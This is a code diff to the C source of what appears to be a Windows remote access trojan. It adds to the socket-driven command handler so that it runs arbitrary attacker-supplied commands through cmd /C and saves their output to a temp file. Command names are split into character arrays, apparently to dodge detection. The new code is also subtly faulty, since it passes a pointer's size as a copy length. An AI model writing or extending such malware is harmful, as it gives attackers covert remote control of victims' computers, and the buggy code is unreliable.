@@ -18,6 +18,7 @@ typedef BOOL _GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
 typedef BOOL _GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
 
 #define SOCKET_BUFFER_SIZE 256
+#define SPLIT_STRING_ARRAY_SIZE 16
 #define UNLEN 256
 
 struct RATSocket
@@ -41,7 +42,7 @@ int SocketSend(RATSocket* ratSocket, char* messageBuffer)
 	return 0;
 }
 
-int SplitString(char* str, char* dest[16], char* seps)
+int SplitString(char* str, char* dest[SPLIT_STRING_ARRAY_SIZE], char* seps)
 {
 	int index = 0;
 	
@@ -167,7 +168,7 @@ WinMain(HINSTANCE hInstance,
 		char ca_cmd[] = { 'c','m','d',0 };
 		char ca_shutdown[] = { 's','h','u','t','d','o','w','n',0 };
 
-		char* splittedCommand[16] = {};
+		char* splittedCommand[SPLIT_STRING_ARRAY_SIZE] = {};
 		SplitString(recvBuffer, splittedCommand, " ");
 		
 		if ( strcmp(splittedCommand[0], ca_info) == 0 )
@@ -237,7 +238,17 @@ WinMain(HINSTANCE hInstance,
 			char tempPath[MAX_PATH];
 			GetTempPathA(MAX_PATH, tempPath);
 
-			char cmdArg[MAX_PATH+8] = { '/','C',' ','d','i','r',' ','>',' ',0 };
+			char cmdArg[MAX_PATH+8] = { '/','C',' ',0 };
+
+			int commandIndex = 1;
+			while ( splittedCommand[commandIndex] != NULL )
+			{
+				strncat_s(cmdArg, splittedCommand[commandIndex], sizeof(splittedCommand[commandIndex]));
+				strncat_s(cmdArg, " ", 1);
+				commandIndex++;
+			}
+
+			strncat_s(cmdArg, " > ", 3);
 			strncat_s(cmdArg, tempPath, sizeof(tempPath));
 			strncat_s(cmdArg, "test.txt", 8);
 	
